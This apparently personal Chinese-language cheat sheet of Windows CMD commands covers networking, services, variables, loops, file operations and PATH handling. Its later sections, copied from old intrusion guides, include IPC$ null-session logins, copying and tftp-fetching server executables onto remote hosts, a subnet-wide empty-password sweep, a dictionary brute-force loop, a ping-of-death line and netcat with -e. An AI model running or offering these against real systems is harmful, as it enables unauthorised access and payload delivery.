# cmd

[CMD有哪些有趣的命令？ - 知乎](https://www.zhihu.com/question/29930842?sort=created)
[Windows 命令 | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands#s)
[Windows CMD命令大全(值得收藏)_DOS/BAT_脚本之家](https://www.jb51.net/article/141568.htm)
[Windows/Mac/Linux/ssh将shell内容输出到剪贴板_TaQini852的博客-CSDN博客_linux 输出到剪贴板](https://blog.csdn.net/smalosnail/article/details/120589901)

```cmd
@REM ping, n指定请求数, i生存时间, w超时时间
ping 127.0.0.1
ping 127.0.0.1 -t
ping 127.0.0.1 -n 5 -i 1 -w 1

@REM arp缓存
arp -a

@REM 查看本机开启的端口
netstat -a -n

netstat -ano | findstr "1080"
tasklist | findstr "4568"

@REM 查看所有用户
net user

@REM 关闭桌面环境
taskkill /F /IM explorer.exe

@REM 仅打开文件管理器
start explorer %userprofile%

@REM 打开桌面环境
start explorer
```

```
start "%ProgramFiles(x86)%steam"
```

```tinymind
cmd
    judge
        if
        choice
    loop
        set var=1
        echo %var%
    var
        set
```

```tinymind
sys
    ip
    file
        mkdir
```

## network

[route Cmd详解 - binsite - 博客园](https://www.cnblogs.com/bingle/p/4243988.html)

```cmd
arp -a
ipconfig
ping -I source_ip destination_ip -c 5
telnet ip portnumber
route print
route ADD destination_network MASK subnet_mask gateway_ip
route -p add 192.168.0.0 mask 255.255.0.0 192.168.3.1
route delete 10.41.0.0 mask 255.255.0.0
route delete 10.
route delete 192.0.0.0 mask 0.0.0.0  192.168.3.1
```

## 注销

[使用cmd注销用户、注销当前用户_51CTO博客_用户已注销](https://blog.51cto.com/tianma3798/1735409)

注销当前用户
logoff

注销其他用户
query user
logoff ID

注销
shutdown /l

关机
shutdown /s

重启
shutdown /r

指定时间后关机（秒）
shutdown /t 

### netstat

```cmd
netstat -a 查看开启了哪些端口,常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况
netstat -s 查看正在使用的所有协议使用情况
```

## 剪切板

[如何使用Windows命令获取剪贴板内容？ - 问答 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/ask/sof/48361)

```cmd
: 将输出复制至剪贴板
echo "hello windows" | clip

: 将文件中的内容全部复制至剪贴板
clip < remade.txt
```

```ps1
# 获取剪切板
powershell get-clipboard
powershell -command "Get-Clipboard"
doskey unclip=(powershell -command "Get-Clipboard") $*

# 使用剪切板
Get-Content test.txt | Set-Clipboard
```

## sc

sc config 服务名 start= auto|demand|disabled

[sc query]   查看所有服务的运行状态
[sc query 服务名]   查看某个服务的运行状态。
[sc qc 服务名]       查看某个服务的配置信息。
[sc start 服务名]    启动服务。
[sc stop 服务名]    停止服务。
[sc delete 服务名]    删除服务。

sc config spacedeskService start=demand
sc config MouseWithoutBordersSvc start=demand

## net

```cmd
net use ipipc$ " " /user:" " 建立IPC空链接
net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接
net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:
net use h: ipc$ 登陆后映射对方C：到本地为H:
net use ipipc$ /del 删除IPC链接
net use h: /del 删除映射对方到本地的为H:的映射
net user 用户名　密码　/add 建立用户
net user guest /active:yes 激活guest用户
net user 查看有哪些用户
net user 帐户名 查看帐户的属性
net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限
net start 查看开启了哪些服务
net start 服务名　开启服务；(如:net start telnet， net start schedule)
net stop 服务名 停止某服务
net time 目标ip 查看对方时间
net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息
net view 查看本地局域网内开启了哪些共享
net view ip 查看对方局域网内开启了哪些共享
net config 显示系统网络设置
net logoff 断开连接的共享
net pause 服务名 暂停某服务
net send ip "文本信息" 向对方发信息
net ver 局域网内正在使用的网络连接类型和信息
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ /del 删除ipc$共享
net share c$ /del 删除C：共享
net user guest 12345 用guest用户登陆后用将密码改为12345
net password 密码 更改系统登陆密码
```

## DISM 

[基本 DISM API 示例 | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-hardware/manufacture/desktop/dism/basic-dism-api-sample?view=windows-11)

```
检查映像版本
Dism /online /Get-CurrentEdition

检查系统是否可升级
Dism /online /Get-TargetEditions

查看驱动程序信息
dism /online /get-drivers /format:table
```

## winget

```
winget search 
winget install 

winget upgrade 
winget upgrade --all -h
```

## 注释

[cmd的注释符号是什么？_Zola的博客-CSDN博客_cmd 注释](https://blog.csdn.net/weixin_42596182/article/details/93783388)

1. ::，注释内容（第一个冒号后也可以跟任何一个非字母数字的字符）
2. rem，注释内容（不能出现重定向符号和管道符号）
3. %注释内容%（可以用作行间注释，不能出现重定向符号和管道符号）
4. :标签，注释内容（可以用作标签下方段的执行内容）

date - b

## 变量

[07-CMD_set命令详解_forwardNow-CSDN博客_cmd set](https://blog.csdn.net/wuqinfei_cs/article/details/9331869)

```cmd
rem 输入

set var=1 
echo %var%

rem 四则运算

set /p a=输入

set a=1
set /a a += 2
set /a b = a + 3
set /a c = a - 1
set /a d = a * 2
set /a e = a / 2
set /a f = 5 % 2
echo 自增%a% 加%b% 减%c% 乘%d% 除%e% 余%f%

rem 位运算

set a=1
set /a b1 = 1 "&" 1 
set /a b2 = 1 "&" 0 
set /a b3 = 0 "&" 0 
set /a c1 = 1 "|" 1 
set /a c2 = 1 "|" 0 
set /a c3 = 0 "|" 0
set /a d0 = !0 
set /a d1 = !1 
set /a m1 = 1 "<<" 1
set /a m2 = 1 ">>" 1
echo 11与=%b1% 10与=%b2% 00与=%b3% 
echo 11或=%c1% 10或=%c2% 00或=%c3%
echo 非0=%d0% 非1=%d1% 
echo 1左移1=%m1% 1右移1=%m2%

set /p var=input
echo %var%

rem 替换

set var=a#b
set str=%var:#=.%
echo #替换为. %str%

rem 截取

set var=0123456789
echo %var:~1,4%
echo %var:~-3%

set var=0123456789
set /a len=\1
echo %len%

rem 参数

echo.>a.cmd
a.cmd 123
echo %0

set testVar=test^^1
set testVar=test^&1
echo %testVar%

cd /d "%~pd0"
```

### winget

winget search pkg
winget install pkg

winget upgrade --all

### 系统变量

```cmd
set - 查看当前所有变量

path - 查看Path
    path string - path修改为string
    path : - 清空path
    path=%path%;string - 添加string到path中

rem 系统变量
echo %homedrive% - C:
echo %homepath% - \Users\user
echo %CD% - current directory, C:\Users\user
echo %DATE% - 2021/04/09 周五, 用跟 DATE 命令同样的格式扩展到当前日期。
echo %TIME% - 23:55:36.44, 用跟 TIME 命令同样的格式扩展到当前时间。
echo %RANDOM% - 扩展到 0 和 32767 之间的任意十进制数字。
echo %ERRORLEVEL% - 扩展到当前 ERRORLEVEL 数值, 上一个命令执行成果为0，否则为1
echo %CMDEXTVERSION% - 扩展到当前命令处理器扩展版本号。
echo %CMDCMDLINE% - 扩展到调用命令处理器的原始命令行。
echo %HIGHESTNUMANODENUMBER% - 扩展到此计算机上的最高 NUMA 节点号。

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\user\AppData\Roaming
ComSpec=C:\WINDOWS\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\zach
Path=
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
SystemDrive=C:
SystemRoot=C:\WINDOWS
USERNAME=zach
USERPROFILE=%homepath%

tasklist | find "abc.exe"
if %errorlevel% == 0 (taskkill /IM abc.exe)

[CMD 一条命令 执行 多条命令_夏华东的博客的博客-CSDN博客_cmd一行多条命令](https://blog.csdn.net/weixin_44493841/article/details/107140526)

如果想一次运行多条命令可能用到的连接符个人了解到的有三个：&&，|| 和 &。

[DOS批处理中%~dp0等扩充变量语法详解_DOS/BAT_脚本之家](https://www.jb51.net/article/97588.htm)

```cmd
脚本参数

@REM 参数个数
set argC=0
for %%x in (%*) do Set /A argC+=1
echo %argC%

%* 包含指令和所有参数
%0到%9，%0表示文件名本身，参数用%1到%9
%~d0 是指批处理所在的盘符，其中d代表drive
%~p0 是指批处理所在的目录，其中p代表path
%~dp0 是批处理所在的盘符加路径

:: ~I - 删除任何引号 (") ，扩充 %I
:: %~fI - 将 %I 扩充到一个完全合格的路径名
:: %~dI - 仅将 %I 扩充到一个驱动器号
:: %~pI - 仅将 %I 扩充到一个路径
:: %~nI - 仅将 %I 扩充到一个文件名
:: %~xI - 仅将 %I 扩充到一个文件扩展名
:: %~sI - 扩充的路径只含有短名
:: %~aI - 将 %I 扩充到文件的文件属性
:: %~tI - 将 %I 扩充到文件的日期 / 时间
:: %~zI - 将 %I 扩充到文件的大小
:: %~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充
:: 到找到的第一个完全合格的名称。如果环境变量名
:: 未被定义，或者没有找到文件，此组合键会扩充到
:: 空字符串
:: 可以组合修饰符来得到多重结果 :
:: %~dpI - 仅将 %I 扩充到一个驱动器号和路径
:: %~nxI - 仅将 %I 扩充到一个文件名和扩展名
:: %~fsI - 仅将 %I 扩充到一个带有短名的完整路径名
:: %~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充
:: 到找到的第一个驱动器号和路径。
:: %~ftzaI - 将 %I 扩充到类似输出线路的 DIR
```

```
aa && bb
含义：执行aa，成功后再执行bb
例子： a.js && node b.js
如果a.js运行失败则b.js不会再运行

aa || bb
含义：先执行aa，若执行成功则不再执行bb，若失败则再执行bb
例子： a.js || node b.js
如果a.js运行失败则b.js再运行，如果a.js运行成功则b.js不再运行

aa & bb
含义：先执行aa再执行bb，无论aa是否成功
例子： node a.js & node b.js
先运行a.js运行，不管运行a.js文件是否报错，b.js接着运行
```

## 通配符

```
md test
echo.>123.txt
echo.>456.txt
del 4*
```

[route Cmd详解 - binsite - 博客园](https://www.cnblogs.com/bingle/p/4243988.html)

## file

[cmd删除文件命令del/erase和删除目录命令rmdir/rd - Macrored - 博客园](https://www.cnblogs.com/macrored/p/11415741.html)

### directory

```cmd
cd/ - 当前卷根目录
cd /d d:\directory
cd.. - 上一级目录

dir /a/s

md dirname
md 

rem 删除空文件夹
rd dirname 
rmdir dirname

rem 删除非空目录, /Q 安静模式, 带/S 删除目录树时不要求确认
rd /s/q dirname
rmdir /s/q dirname
```

### file

```cmd
echo abc > a.txt
ren a.txt b.txt
copy a.txt b.txt

del filename.txt
del *.txt
erase *.txt
```

### link

```cmd
rem link

rem 硬链接:修改1.txt后，2.txt做出同样修改，删除1.txt不影响2.txt正常使用
mklink /H 2.txt 1.txt

C:>fsutil hardlink list 1.txt
Desktop\1.txt
Desktop\2.txt

rem 目录链接（类似于快捷方式），显示为dir2，删除dir1后dir2无法使用

mklink /J dir2 dir1

C:>dir /a
<DIR>          dir1
<JUNCTION>     dir2 [%homepath%\Desktop\dir1]
```

## loop

[cmd for 用法 - bug_x - 博客园](https://www.cnblogs.com/cbugs/p/8992059.html)

- `FOR %variable IN (set) DO command [command-parameters]`

```cmd
rem for
rem 输出1 2 3 4 5
for /l %i in (1,1,5) do @echo %i
rem 枚举了c盘所有目录
for /r c:\ %i in (boot.ini) do echo %i 
```

```cmd
rem while
rem 没有直接的while语句

SET /A "index=1"
SET /A "count=5"
:while
if %index% leq %count% (
   echo The value of index is %index%
   SET /A "index=index + 1"
   goto :while
)
```

## judge

[cmd if条件 条件判断_DOS/BAT_脚本之家](https://www.jb51.net/article/18979.htm)

```cmd
@rem if

rem ==, equ
if "abc"=="xyz" (echo 字符串abc等于字符串xyz) else (echo 字符串abc不等于字符串xyz)
if 1 equ 2 (echo 1等于2) else (echo 1不等于2)
if %errorlevel% == 0 (echo 执行成功) else if %errorlevel% == 1 (echo 执行失败)

rem if defined
if defined str (echo 变量str已经被赋值，其值为%str%) else (echo 变量str的值为空)

rem if exist
if exist d:\test.txt (echo D盘下有test.txt存在) else (echo D盘下不存在test.txt)

rem if, else if, else
set varA=B
if "%varA%"=="A" (echo %varA% is A) else if "%varA%"=="B" (echo %varA% is B) else (echo %varA% is C)

rem 与或非（与或没有）
if not %a%=="" echo a不为空
```

```cmd
rem choice
choice /C YNC /M "确认请按 Y，否请按 N，或者取消请按 C。
```

## find

[Windows CMD中 find命令（字符串查找）_迎风悟极道的博客-CSDN博客_cmd find](https://blog.csdn.net/icanlove/article/details/37567591)

```cmd
rem find
ipconfig | find "IPv4"
find "abc" d:\test.txt

rem 不区分大小写的
find /i "Abc" d:\test.txt

rem /v 不包含
find /v "Abc" d:\test.txt 

rem 统计下包含某个字符串的总行数
find /c "abc" d:\test.txt

rem 在每行的行首显示行号
find /n "abc" d:\test.txt
```

[Windows CMD中 findstr命令_迎风悟极道的博客-CSDN博客_cmd findstr](https://blog.csdn.net/icanlove/article/details/37567253)

```cmd
rem findstr
findstr "abc" d:\test.txt

rem 查找带有空格的字符串
findstr /c:"abc xyz" d:\test.txt

rem 在当前目录及所有子目录下的所有文件中查找
findstr /s /i "abc"  *.*

rem 正则表达式
findstr "^[a-z]*$" test.txt
```

## string

```cmd
rem 截取，第一个字符下标为0
echo %date%, %date:~0,4% - 截取前四个字符，2000/01/01 周六，2000
echo %date%, %date:~5,2% - 从第5个字符起，截取2个字符，2000/01/01 周六，01
```

### time

```cmd
rem 时间 - 12:00:00.00
echo %time%

rem 日期 - 2000/01/01 周六
echo %date%

rem 完整时间 - 20000101120000
echo %date:~0,4%%date:~5,2%%date:~8,2%%time:~0,2%%time:~3,2%%time:~6,2%

rem 完整日期 - 20000101
echo %date:~0,4%%date:~5,2%%date:~8,2%

rem 常用格式 - 20000101-120000
echo %date:~0,4%%date:~5,2%%date:~8,2%-%time:~0,2%%time:~3,2%%time:~6,2%
```

[Windows CMD命令大全(值得收藏)_DOS/BAT_脚本之家](https://www.jb51.net/article/141568.htm)

```tinymind
cli
	path
	software
	variable
```
## path

查看，添加，删除，清空

```cmd
rem windows cmd

rem list
echo %path%
path

rem add
path=%path%;string
```

```powershell
windows powershell

:: add temp
$env:Path += ";c:\users\xiaomin\go\bin"

:: add 永久
setx /M PATH "%PATH%;c:\users\xiaomin\go\bin"
```

```bash
# bash & mac

# list
cat /home/xiaomin/.bash_profile

# add
export PATH=$PATH:/home/xiaomin/go/bin
```

## CMD命令锦集

1. gpedit.msc-----组策略
2. sndrec32-------录音机
3. Nslookup-------IP地址侦测器 ，是一个监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。
4. explorer-------打开资源管理器
5. logoff---------注销命令
6. shutdown-------60秒倒计时关机命令
7. lusrmgr.msc----本机用户和组
8. services.msc---本地服务设置
9. oobe/msoobe /a----检查XP是否激活
10. notepad--------打开记事本
11. cleanmgr-------垃圾整理
12. net start messenger----开始信使服务
13. compmgmt.msc---计算机管理
14. net stop messenger-----停止信使服务
15. conf-----------启动netmeeting
16. dvdplay--------DVD播放器
17. charmap--------启动字符映射表
18. diskmgmt.msc---磁盘管理实用程序
19. calc-----------启动计算器
20. dfrg.msc-------磁盘碎片整理程序
21. chkdsk.exe-----Chkdsk磁盘检查
22. devmgmt.msc--- 设备管理器
23. regsvr32 /u *.dll----停止dll文件运行
24. drwtsn32------ 系统医生
25. rononce -p----15秒关机
26. dxdiag---------检查DirectX信息
27. regedt32-------注册表编辑器
28. Msconfig.exe---系统配置实用程序
29. rsop.msc-------组策略结果集
30. mem.exe--------显示内存使用情况
31. regedit.exe----注册表
32. winchat--------XP自带局域网聊天
33. progman--------程序管理器
34. winmsd---------系统信息
35. perfmon.msc----计算机性能监测程序
36. winver---------检查Windows版本
37. sfc /scannow-----扫描错误并复原
38. taskmgr-----任务管理器（2000/xp/2003
40. wmimgmt.msc----打开windows管理体系结构(WMI)
41. wupdmgr--------windows更新程序
42. wscript--------windows脚本宿主设置
43. write----------写字板
45. wiaacmgr-------扫描仪和照相机向导
46. winchat--------XP自带局域网聊天
49. mplayer2-------简易widnows media player
50. mspaint--------画图板
51. mstsc----------远程桌面连接
53. magnify--------放大镜实用程序
54. mmc------------打开控制台
55. mobsync--------同步命令
57. iexpress-------木马捆绑工具，系统自带
58. fsmgmt.msc-----共享文件夹管理器
59. utilman--------辅助工具管理器
61. dcomcnfg-------打开系统组件服务
62. ddeshare-------打开DDE共享设置
110. osk------------打开屏幕键盘
111. odbcad32-------ODBC数据源管理器
112. oobe/msoobe /a----检查XP是否激活
68. ntbackup-------系统备份和还原
69. narrator-------屏幕“讲述人”
70. ntmsmgr.msc----移动存储管理器
71. ntmsoprq.msc---移动存储管理员操作请求
72. netstat -an----(TC)命令检查接口
73. syncapp--------创建一个公文包
74. sysedit--------系统配置编辑器
75. sigverif-------文件签名验证程序
76. ciadv.msc------索引服务程序
77. shrpubw--------创建共享文件夹
78. secpol.msc-----本地安全策略
79. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码
80. services.msc---本地服务设置
81. Sndvol32-------音量控制程序
82. sfc.exe--------系统文件检查器
83. sfc /scannow---windows文件保护
84. ciadv.msc------索引服务程序
85. tourstart------xp简介（安装完成后出现的漫游xp程序）
86. taskmgr--------任务管理器
87. eventvwr-------事件查看器
88. eudcedit-------造字程序
89. compmgmt.msc---计算机管理
90. packager-------对象包装程序
91. perfmon.msc----计算机性能监测程序
92. charmap--------启动字符映射表
93. cliconfg-------SQL SERVER 客户端网络实用程序
94. Clipbrd--------剪贴板查看器
95. conf-----------启动netmeeting
96. certmgr.msc----证书管理实用程序
97. regsvr32 /u *.dll----停止dll文件运行
98. regsvr32 /u zipfldr.dll------取消ZIP支持
99. cmd.exe--------CMD命令提示符

## 操作详解

nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
at id号 开启已注册的某个计划任务
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止
at id号 /delete 停止某个已注册的计划任务
at 查看所有的计划任务
at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机
finger username @host 查看最近有哪些用户登陆
telnet ip 端口 远和登陆服务器,默认端口为23
open ip 连接到IP（属telnet登陆后的命令）
telnet 在本机上直接键入telnet 将进入本机的telnet
copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件
copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下
copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件
用参数/e才可连目录下的子目录一起复制到目标地址下。
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送
tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令
mem 查看cpu使用情况
attrib 文件名(目录名) 查看某文件（目录）的属性
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间
set 指定环境变量名称=要指派给变量的字符 设置环境变量
set 显示当前所有的环境变量
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
pause 暂停批处理程序，并显示出：请按任意键继续....
if 在批处理程序中执行条件处理（更多说明见if命令及变量）
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置
echo 信息 在屏幕上显示出信息
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello
find 文件名 查找某文件
title 标题名字 更改CMD窗口标题名字
color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白
prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )
ver 在DOS窗口下显示版本信息
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS
md　目录名 创建目录
replace 源文件　要替换文件的目录 替换文件
ren 原文件名　新文件名 重命名文件名
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
type 文件名 显示文本文件的内容
more 文件名 逐屏显示输出文件
doskey 要锁定的命令=字符
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=
taskmgr 调出任务管理器
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe
path 路径可执行文件的文件名 为可执行文件设置一个路径。
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；
regedit /e 注册表文件名 导出注册表
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。
cacls 文件名 查看文件的访问用户权限列表
REM 文本内容 在批处理文件中添加注解
netsh 查看或更改本地网络配置情况

## IIS服务命令
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）
iisreset /start或stop 启动（停止）所有Internet服务
iisreset /restart 停止然后重新启动所有Internet服务
iisreset /status 显示所有Internet服务状态
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。

## win2003系统下新增命令（实用部份）：
shutdown /参数 关闭或重启本地或远程主机。
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。
例：shutdown /r /t 0 立即重启本地主机（无延时）
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。

## 批处理命令与变量
1：for命令及变量 基本格式
FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3
　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }
command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开
command_parameters：为特定命令指定参数或命令行开关
IN (set)：指在(set)中取值；DO command ：指执行command
参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。
用法举例：
　　@echo off
echo 用法格式：test.bat *.*.* > test.txt
for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \%1.%%G /user:administrator | find "命令成功完成" >>test.txt
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。
　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。
　　@echo off
echo 用法格式：ok.bat ip
FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200
存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。
七：
2：if命令及变量 基本格式
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。
例：“if "%2%"=="4" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "）
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。
例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到":end"标签处。
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”

## 系统外部命令
注：系统外部命令(均需下载相关工具)
瑞士军刀：nc.exe
参数说明：
　　-h 查看帮助信息
　　-d 后台模式
　　-e prog程序重定向，一但连接就执行[危险]
　　-i secs延时的间隔
　　-l 监听模式，用于入站连接
　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C
　　-n IP地址，不能用域名
　　-o film记录16进制的传输
　　-p[空格]端口 本地端口号
　　-r 随机本地及远程端口
　　-t 使用Telnet交互方式
　　-u UDP模式
　　-v 详细输出，用-vv将更详细
　　-w数字 timeout延时间隔
　　-z 将输入，输出关掉（用于扫锚时）
基本用法：
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口
nc -l -p 80 开启本机的TCP 80端口并监听
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口
